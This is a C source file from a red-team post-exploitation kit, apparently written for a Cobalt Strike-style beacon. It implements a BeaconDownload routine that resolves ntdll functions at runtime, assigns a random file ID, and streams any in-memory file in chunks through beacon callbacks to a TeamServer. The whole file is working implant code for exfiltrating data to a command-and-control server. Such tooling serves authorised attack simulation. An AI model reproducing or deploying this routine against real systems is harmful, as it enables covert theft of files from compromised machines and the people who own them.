/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

ULONG
NTAPI
RtlRandomEx(
	_In_ PULONG Seed
);

#ifndef BEACON_DOWNLOAD_CHUNK_SIZE
#define BEACON_DOWNLOAD_CHUNK_SIZE 10000
#endif

#ifndef CALLBACK_BEACON_FILE
#define CALLBACK_BEACON_FILE 0x02
#endif

#ifndef CALLBACK_BEACON_FILE_WRITE
#define CALLBACK_BEACON_FILE_WRITE 0x08
#endif

#ifndef CALLBACK_BEACON_FILE_CLOSE 
#define CALLBACK_BEACON_FILE_CLOSE 0x09
#endif

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" )))
{
	ULONG	FileId;
	ULONG	Length;
	UCHAR	FileName[ 0 ];
} BEACON_FILE, *PBEACON_FILE ;

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" )))
{
	ULONG	FileId;
	UCHAR	Buffer[ 0 ];
} BEACON_FILE_WRITE, *PBEACON_FILE_WRITE ;

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" )))
{
	ULONG	FileId;
} BEACON_FILE_CLOSE, *PBEACON_FILE_CLOSE ;

typedef struct
{
	D_API( RtlFreeHeap );
	D_API( RtlRandomEx );
} API ;

/*!
 *
 * Purpose:
 *
 * Downloads an arbitrary file to TeamServer. The
 * file can be found at `View` -> `Downloads`.
 *
!*/
VOID BeaconDownload( _In_ PVOID Buffer, _In_ ULONG Length, _In_ PCHAR FileName )
{
	API			Api;

	ULONG			Fid = 0;
	ULONG			Len = 0;
	ULONG			Min = 0;

	PVOID			Chk = NULL;
	HANDLE			Ntl = NULL;
	PBUFFER			Out = NULL;
	PBEACON_FILE		Bfo = NULL;
	PBEACON_FILE_WRITE	Bfw = NULL;
	PBEACON_FILE_CLOSE	Bfc = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Ntl = LoadLibraryA( "ntdll.dll" );

	if ( Ntl != NULL ) {
		Api.RtlFreeHeap = C_PTR( GetProcAddress( Ntl, "RtlFreeHeap" ) );
		Api.RtlRandomEx = C_PTR( GetProcAddress( Ntl, "RtlRandomEx" ) );

		Fid = NtGetTickCount();
		Fid = Api.RtlRandomEx( &Fid );
		Fid = Api.RtlRandomEx( &Fid );

		/* Create an buffer to build a BEACON_FILE request */
		if ( ( Out = BufferCreate() ) != NULL ) {
			if ( BufferExtend( Out, sizeof( BEACON_FILE ) ) ) {
				if ( BufferPrintf( Out, "%s", FileName ) ) {
					/* Set header information */
					Bfo = C_PTR( Out->Buffer );
					Bfo->FileId = Fid;
					Bfo->Length = Length;

					/* Send the CALLBACK_BEACON_FILE request */
					BeaconOutput( CALLBACK_BEACON_FILE, Out->Buffer, Out->Length );
				};
			};
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
			Out = NULL;
		};

		/* Set lengths and sizes */
		Len = Length;
		Chk = C_PTR( Buffer );
		Min = 0;

		/* Create chunks and send them to the TeamServer */
		do 
		{
			/* Get the smallest size we can send at the moment */
			Min = min( BEACON_DOWNLOAD_CHUNK_SIZE, Len );

			/* Allocate a buffer */
			if ( ( Out = BufferCreate() ) != NULL ) {
				/* Create a buffer big enough to hold the request */
				if ( BufferExtend( Out, sizeof( BEACON_FILE_WRITE ) + Min ) ) {

					/* Set header information */
					Bfw = C_PTR( Out->Buffer );
					Bfw->FileId = Fid;

					/* Copy over the buffer */
					__builtin_memcpy( Bfw->Buffer, Chk, Min );

					/* Send the BEACON_FILE_WRITE */
					BeaconOutput( CALLBACK_BEACON_FILE_WRITE, Out->Buffer, Out->Length );
				};
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
				Out = NULL;
			};

			/* The data was 'sent'. We subtract what was sent */
			Len = Len - Min;
			Chk = C_PTR( U_PTR( Chk ) + Min );
		} while ( Len != 0 );

		/* Create an output buffer for BEACON_FILE_CLOSE */
		if ( ( Out = BufferCreate() ) != NULL ) {
			if ( BufferExtend( Out, sizeof( BEACON_FILE_CLOSE ) ) ) {
				/* Set header information */
				Bfc = C_PTR( Out->Buffer );
				Bfc->FileId = Fid;

				/* Send BEACON_FILE_CLOSE */
				BeaconOutput( CALLBACK_BEACON_FILE_CLOSE, Out->Buffer, Out->Length );
			};
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
			Out = NULL;
		};

		/* Dereference */
		FreeLibrary( Ntl );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
};
